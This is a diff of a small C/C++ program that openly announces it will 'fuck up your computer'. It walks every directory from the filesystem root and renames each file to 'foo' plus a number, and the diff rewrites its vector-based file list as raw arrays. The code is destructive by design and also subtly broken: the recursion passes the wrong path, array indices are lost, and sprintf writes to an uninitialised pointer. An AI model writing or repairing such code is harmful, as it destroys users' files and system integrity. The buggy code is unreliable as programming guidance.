@@ -1,7 +1,5 @@
 #include <stdio.h>
-#include <vector>
 #include <dirent.h>
-#include <string>
 #include <cstring>
 
 #ifdef WIN32
@@ -12,7 +10,7 @@
 #define ROOT "/"
 #endif
 
-int getFiles(const char* root, std::vector<const char*>& files){
+int getFiles(const char* root,char** files,int n=0){
     DIR* dir;
     struct dirent* entry;
 
@@ -28,7 +26,7 @@ int getFiles(const char* root, std::vector<const char*>& files){
         if(entry->d_type == DT_DIR){
             getFiles(root,files);
         }else{
-            files.push_back(path);
+            files[++n] = path;
         }
     }while(entry = readdir(dir));
     closedir(dir);
@@ -107,25 +105,26 @@ int main(int argc, char const *argv[])
 {
     printf("Hello, today I will be fucking up your computer.");
 
-    std::vector<const char*> files;
+    int size = getFileCount(ROOT);
+    char** file_arr = new char*[size];
 
-    //const char** file_arr = new char*[getFileCount(ROOT)];
+    if(getFiles(ROOT,file_arr)) return 1;
 
-    if(getFiles(ROOT,files)) return 1;
-
-    for(int i=0;i<files.size();i++){
-        const char* name = files.at(i);
-        const char* s;
+    int i=0;
+    while(i<size){
+        char* name = file_arr[i];
+        char* s;
         char* str;
-        std::string foo = name;
 
         int l = strrchr(name,PATH_SEPERATOR)-name;
         int l2 = strrchr(name,'.')-name;
 
-        foo.replace(l,(l2-l),"foo%d");
+        s = replace(l,(l2-l),"foo%d",name);
 
-        sprintf(str,foo.c_str(),i);
+        sprintf(str,s,i);
         rename(name,str);
+
+        i++;
     }
 
     printf("Replaced all of your filenames with foo.");
